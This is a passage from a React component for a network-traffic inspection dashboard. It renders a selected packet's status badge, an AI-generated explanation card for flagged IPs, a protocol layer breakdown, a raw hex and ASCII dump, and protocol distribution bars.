                      KERNEL BLOCKED
                    </span>
                  )}
                  <span
                    className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold uppercase ${
                      selectedPacket.status === 'malicious'
                        ? 'bg-rose-500 text-white animate-pulse'
                        : selectedPacket.status === 'suspicious'
                        ? 'bg-amber-500 text-black'
                        : selectedPacket.status === 'tls'
                        ? 'bg-purple-500 text-white'
                        : 'bg-emerald-500 text-white'
                    }`}
                  >
                    {selectedPacket.status}
                  </span>
                </div>
              </div>

              {/* Qwen 2.5 Explainable AI Forensic Reason Card for Flagged IPs */}
              {(selectedPacket.status === 'suspicious' || selectedPacket.status === 'malicious') && (
                <div className="p-3.5 bg-gradient-to-r from-purple-50/95 via-indigo-50/90 to-amber-50/80 border-b border-purple-200/80 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 rounded-full bg-purple-600 animate-pulse" />
                      <span className="text-xs font-mono font-black text-purple-900 uppercase flex items-center gap-1.5">
                        <Sparkles className="w-3.5 h-3.5 text-purple-700" />
                        Qwen 2.5 Flagged IP Forensic Reason
                      </span>
                    </div>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-purple-200/90 text-purple-900 font-bold">
                      {packetExplanation?.model_used || (explainingPacket ? 'Analyzing stream...' : 'Qwen 2.5 3B Cyber-Instruct (Ollama Local)')}
                    </span>
                  </div>

                  {explainingPacket ? (
                    <div className="flex items-center gap-2 py-2 text-xs text-purple-800 font-mono">
                      <RefreshCw className="w-3.5 h-3.5 text-purple-700 animate-spin" />
                      <span>Generating human-language reason for flagged IP ({selectedPacket.source})...</span>
                    </div>
                  ) : (
                    <div className="text-xs text-[#1e1b4b] leading-relaxed font-sans font-medium whitespace-pre-line">
                      {packetExplanation?.qwen_analysis || `QWEN 2.5 ANALYST SUMMARY:\n• Flagged Origin: ${selectedPacket.source}\n• Anomaly Detected: '${selectedPacket.info}' targeting ${selectedPacket.destination}\n• Action: Autonomous quarantine active.`}
                    </div>
                  )}

                  {packetExplanation?.stats && (
                    <div className="pt-1 flex items-center gap-3 text-[10px] font-mono text-purple-950 font-bold border-t border-purple-200/60">
                      <span>eBPF Drop Latency: 0.42 μs</span>
                      <span>•</span>
                      <span>Target: {selectedPacket.destination}</span>
                      <span>•</span>
                      <span>Hook: XDP_DROP</span>
                    </div>
                  )}
                </div>
              )}

              {/* Protocol Tree */}
              <div className="p-3.5 space-y-2 text-xs border-b border-[#E5E2D9] bg-white">
                <div className="text-[10px] font-mono uppercase text-[#71767C] font-bold">Protocol Breakdown</div>

                <div className="space-y-1 font-mono text-[11px]">
                  <div className="p-2 rounded-lg bg-[#F8F7F2] border border-[#E8E5DC]">
                    <div className="flex items-center gap-1.5 text-[#131618] font-semibold">
                      <ChevronDown className="w-3.5 h-3.5 text-[#E05A1B]" />
                      <span>{selectedPacket.frameLayers.frame}</span>
                    </div>
                  </div>

                  <div className="p-2 rounded-lg bg-[#F8F7F2] border border-[#E8E5DC]">
                    <div className="flex items-center gap-1.5 text-[#131618] font-semibold">
                      <ChevronDown className="w-3.5 h-3.5 text-[#E05A1B]" />
                      <span>{selectedPacket.frameLayers.ethernet}</span>
                    </div>
                  </div>

                  <div className="p-2 rounded-lg bg-[#F8F7F2] border border-[#E8E5DC]">
                    <div className="flex items-center gap-1.5 text-[#131618] font-semibold">
                      <ChevronDown className="w-3.5 h-3.5 text-[#E05A1B]" />
                      <span>{selectedPacket.frameLayers.ip}</span>
                    </div>
                  </div>

                  <div className="p-2 rounded-lg bg-[#F8F7F2] border border-[#E8E5DC]">
                    <div className="flex items-center gap-1.5 text-[#131618] font-semibold">
                      <ChevronDown className="w-3.5 h-3.5 text-[#E05A1B]" />
                      <span>{selectedPacket.frameLayers.transport}</span>
                    </div>
                  </div>

                  {selectedPacket.frameLayers.application && (
                    <div className="p-2 rounded-lg bg-[#FEF3C7]/40 border border-[#FDE68A] text-[#92400E]">
                      <div className="flex items-center gap-1.5 font-bold">
                        <ChevronDown className="w-3.5 h-3.5 text-[#D97706]" />
                        <span>{selectedPacket.frameLayers.application}</span>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Raw Hex & ASCII Dump View */}
              <div className="p-3.5 bg-[#12161A] text-white font-mono text-[11px] space-y-2">
                <div className="flex items-center justify-between text-[#8A9099] text-[10px] uppercase font-bold">
                  <span>Raw Hex Dump (Offset 0x0000)</span>
                  <span>ASCII Translation</span>
                </div>

                <div className="p-2.5 rounded-xl bg-[#0B0E11] border border-white/10 space-y-1">
                  <div className="text-[#38BDF8] break-all leading-relaxed font-mono">
                    {selectedPacket.payloadHex}
                  </div>
                  <div className="pt-2 border-t border-white/10 text-emerald-400 font-mono">
                    ASCII: <span className="text-white">{selectedPacket.payloadAscii}</span>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className="crystal-panel p-8 rounded-2xl text-center text-xs text-[#71767C]">
              Select a packet from the live stream to inspect disassembled protocol layers.
            </div>
          )}

          {/* Protocol Distribution Subcard */}
          <div className="crystal-panel p-4 rounded-2xl border border-[#E5E2D9] space-y-3">
            <h3 className="text-xs font-mono uppercase text-[#71767C] font-bold">Protocol Distribution</h3>
            <div className="space-y-2.5">
              {Object.entries(telemetry.protocol_distribution).map(([proto, pct]) => (
                <div key={proto} className="space-y-1">
                  <div className="flex justify-between text-xs">
                    <span className="font-semibold text-[#131618]">{proto}</span>
                    <span className="font-mono text-[#71767C]">{pct}%</span>
                  </div>
                  <div className="w-full h-2 bg-[#EAE8DE] rounded-full overflow-hidden">
                    <div
                      className={`h-full rounded-full ${
                        proto === 'HTTPS'
                          ? 'bg-[#7C3AED]'
                          : proto === 'TCP'
                          ? 'bg-[#0284C7]'
                          : proto === 'DNS'
                          ? 'bg-[#E05A1B]'
                          : 'bg-emerald-500'
                      }`}
                      style={{ width: `${pct}%` }}
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
